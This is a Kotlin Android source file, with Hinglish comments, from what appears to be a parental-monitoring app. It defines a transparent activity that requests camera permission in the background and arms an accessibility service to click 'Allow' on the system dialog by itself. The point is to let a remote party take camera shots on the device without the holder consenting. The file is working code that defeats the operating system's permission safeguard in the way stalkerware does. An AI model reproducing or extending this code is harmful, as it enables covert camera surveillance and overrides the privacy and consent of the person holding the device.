package com.familyguard.child.ui

import android.Manifest
import android.os.Bundle
import android.os.SystemClock
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import com.familyguard.child.data.Store

/**
 * Camera permission ko BACKGROUND me maangne ke liye transparent activity —
 * GalleryPermActivity ka exact counterpart. vc11 tak "camera" command permission
 * missing par sirf "camera unavailable" bhejta tha — REQUEST kabhi nahi hoti thi,
 * isliye fresh-install (wizard ka cam step fail hua ho) par camera PERMANENT dead
 * tha. Ab parent "Selfie/Back cam" dabate hi background me system dialog khulti
 * hai aur a11y armed "cam" step par Allow khud click karta hai.
 */
class CameraPermActivity : ComponentActivity() {

    private val permLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) {
            // Result kya bhi ho — dialog ka kaam khatam. A11y ne Allow click kiya
            // hoga to permission mil chuki hogi; parent camera dobara tap karega
            // to shot turant lega.
            finish()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!Store.paired || Store.released) {
            finish()
            return
        }
        // A11y auto-allow arm karo (wizard "cam" step) — dialog dikhTE hi
        // EnforcementService "Allow" click karta hai.
        Store.autoClickStep = "cam"
        Store.autoClickUntil = SystemClock.elapsedRealtime() + 30_000L
        runCatching {
            com.familyguard.child.service.EnforcementService.armGalleryAllow()
        }
        runCatching { permLauncher.launch(Manifest.permission.CAMERA) }.onFailure { finish() }
    }
}
